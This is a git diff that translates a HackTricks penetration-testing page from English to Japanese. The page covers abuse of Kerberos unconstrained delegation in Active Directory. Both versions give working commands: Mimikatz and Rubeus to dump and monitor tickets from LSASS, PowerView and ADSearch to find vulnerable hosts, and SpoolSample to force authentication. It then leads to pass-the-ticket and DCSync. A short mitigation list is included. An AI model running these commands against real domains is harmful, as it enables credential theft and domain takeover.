@@ -1,75 +1,61 @@
-# Unconstrained Delegation
+# 制約のない委任
 
-<details>
+これは、ドメイン管理者がドメイン内の任意の**コンピュータ**に設定できる機能です。その後、**ユーザーがコンピュータにログイン**するたびに、そのユーザーの**TGTのコピー**がDCによって提供される**TGSに送信され、LSASSのメモリに保存**されます。したがって、マシンで管理者特権を持っている場合、チケットをダンプして他のマシンでユーザーをなりすますことができます。
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+したがって、ドメイン管理者が「制約のない委任」機能が有効になっているコンピュータにログインし、そのマシンでローカル管理者特権を持っている場合、チケットをダンプしてドメイン管理者をどこでもなりすますことができます（ドメイン特権昇格）。
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+この属性を持つ**コンピュータオブジェクトを見つける**には、[userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx)属性が[ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx)を含んでいるかどうかを確認します。これは、powerviewが行う方法です。
 
-</details>
-
-## Unconstrained delegation
-
-This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.
-
-So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc).
-
-You can **find Computer objects with this attribute** checking if the [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) attribute contains [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:
-
-<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
+```bash
+# 制約のないコンピュータの一覧
 ## Powerview
-Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
-<strong>## ADSearch
-</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
-<strong># Export tickets with Mimikatz
-</strong>privilege::debug
-sekurlsa::tickets /export #Recommended way
-kerberos::list /export #Another way
+Get-NetComputer -Unconstrained # DCは常に表示されますが、特権昇格には役立ちません
+## ADSearch
+ADSearch.exe --search "(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+# Mimikatzでチケットをエクスポート
+privilege::debug
+sekurlsa::tickets /export # 推奨される方法
+kerberos::list /export # 別の方法
 
-# Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>
+# ログインを監視して新しいチケットをエクスポート
+.\Rubeus.exe monitor /targetuser:<username> /interval:10 # 新しいTGTを10秒ごとにチェック
+```
 
-Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
-More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
-[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
+**Mimikatz**または**Rubeus**を使用して、管理者（または被害者のユーザー）のチケットをメモリにロードし、[**パス・ザ・チケット**](pass-the-ticket.md)**を実行します。**\
+詳細情報：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
+[**ired.teamのUnconstrained delegationに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
 
-### **Force Authentication**
+### **強制認証**
 
-If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
-Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.
+攻撃者が「制約のない委任」が許可されたコンピュータを**侵害**できる場合、**プリントサーバー**を**自動的にログイン**させ、サーバーのメモリにTGTを保存することができます。\
+その後、攻撃者は**パス・ザ・チケット攻撃**を実行して、ユーザーのプリントサーバーコンピューターアカウントをなりすますことができます。
 
-To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
-
+プリントサーバーを任意のマシンにログインさせるには、[**SpoolSample**](https://github.com/leechristensen/SpoolSample)を使用できます。
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
+もしTGTがドメインコントローラーから来ている場合、[**DCSync攻撃**](acl-persistence-abuse/#dcsync)を実行して、DCからすべてのハッシュを取得することができます。\
+[**この攻撃に関する詳細は、ired.teamを参照してください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
 
-If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/#dcsync) and obtain all the hashes from the DC.\
-[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)
-
-**Here are other ways to try to force an authentication:**
+**他の認証を強制する方法は以下の通りです:**
 
 {% content-ref url="printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
 {% endcontent-ref %}
 
-### Mitigation
+### 緩和策
 
-* Limit DA/Admin logins to specific services
-* Set "Account is sensitive and cannot be delegated" for privileged accounts.
+* 特定のサービスに対してDA/Adminログインを制限する
+* 特権アカウントに対して「アカウントは機密であり、委任できない」と設定する。
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricks repo](https://github.com/carlospolop/hacktricks)と[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
